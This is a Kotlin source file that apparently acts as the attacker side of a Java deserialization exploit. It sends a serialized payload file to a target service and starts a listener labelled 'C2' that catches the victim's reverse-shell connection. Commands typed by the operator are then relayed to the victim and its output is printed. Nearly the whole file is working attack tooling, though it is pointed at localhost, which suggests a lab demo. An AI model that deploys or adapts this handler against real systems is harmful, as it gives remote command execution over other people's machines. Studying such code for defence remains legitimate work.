import java.io.*
import java.net.ServerSocket
import java.net.Socket
import kotlin.concurrent.thread

fun main() {
    val server = Socket("localhost", 1337)

    // regular use
    /*ObjectOutputStream(server.getOutputStream()).writeObject(7 to 5)
    println(DataInputStream(server.getInputStream()).readInt())*/

    launchReverseShell(server.getOutputStream())

    server.close()
}

fun launchReverseShell(victimStream: OutputStream) {
    val c2 = ServerSocket(25565)
    Runtime.getRuntime().addShutdownHook(thread(start = false) {
        c2.close()
        println("C2 stopped")
    })
    println("C2 started\nAwaiting victim connection...")

    val deployment = thread {
        Thread.sleep(1000)
        // send payload to victim
        victimStream.write(File("../payload.ser").readBytes())
        println("Payload deployed!")
    }
    val victim = c2.accept()
    deployment.join()

    val victimInputStream = victim.getInputStream()
    val victimOutputStream = victim.getOutputStream()

    val watchdog = thread {
        // blocking mode
        victimInputStream.transferTo(System.out)
        println("Victim disconnected")
    }

    while(watchdog.isAlive) {
        val cmd = readln()
        victimOutputStream.write(cmd.toByteArray() + 10)
    }
}